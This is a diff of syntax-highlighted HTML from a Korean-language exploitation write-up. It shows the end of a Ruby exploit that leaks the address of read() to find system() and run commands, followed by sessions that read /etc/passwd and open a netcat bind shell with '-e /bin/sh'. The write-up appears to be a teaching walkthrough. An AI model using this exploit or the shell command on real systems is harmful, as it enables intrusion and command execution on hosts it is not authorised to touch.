-<span class="n">this_read_addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
+<span class="n">this_read_addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nf">unpack</span><span class="p">(</span><span class="s2">"I"</span><span class="p">).</span><span class="nf">first</span>
 
 <span class="c1"># Calculate the address of system()</span>
 <span class="n">this_system_addr</span> <span class="o">=</span> <span class="n">this_read_addr</span> <span class="o">-</span> <span class="n">read_system_diff</span>
 
-<span class="c1"># Write the address back, where it&#39;ll be read() into the correct place by</span>
+<span class="c1"># Write the address back, where it'll be read() into the correct place by</span>
 <span class="c1"># the second read() call</span>
-<span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="o">[</span><span class="n">this_system_addr</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">write</span><span class="p">([</span><span class="n">this_system_addr</span><span class="p">].</span><span class="nf">pack</span><span class="p">(</span><span class="s2">"I"</span><span class="p">))</span>
 
 <span class="c1"># Finally, read the result of the actual command</span>
-<span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
 
 <span class="c1"># Clean up</span>
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div><p>그리고 실행 결과다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div><p>그리고 실행 결과다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>ruby sploit.rb <span class="s2">"cat /etc/passwd"</span>
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
-<span class="o">[</span>...<span class="o">]</span>
-</code></pre></div><p>물론 <code>cat /etc/passwd</code>를 원하는 값으로 바꿀 수 있다 (netcat 리스너를 포함해서!).<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;pwd&quot;</span>
+<span class="o">[</span>...]
+</code></pre></div><p>물론 <code>cat /etc/passwd</code>를 원하는 값으로 바꿀 수 있다 (netcat 리스너를 포함해서!).<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">"pwd"</span>
 /home/ron
-ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;whoami&quot;</span>
+ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">"whoami"</span>
 ron
-ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;nc -vv -l -p 5555 -e /bin/sh&quot;</span> <span class="p">&amp;</span>
-<span class="o">[</span>1<span class="o">]</span> 3015
+ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">"nc -vv -l -p 5555 -e /bin/sh"</span> &amp;
+<span class="o">[</span>1] 3015
 ron@debian-x86 ~ <span class="nv">$ </span>nc -vv localhost 5555
-debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> <span class="m">5555</span> <span class="o">(</span>?<span class="o">)</span> open
+debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1] 5555 <span class="o">(</span>?<span class="o">)</span> open
 <span class="nb">pwd</span>
 /home/ron
 whoami
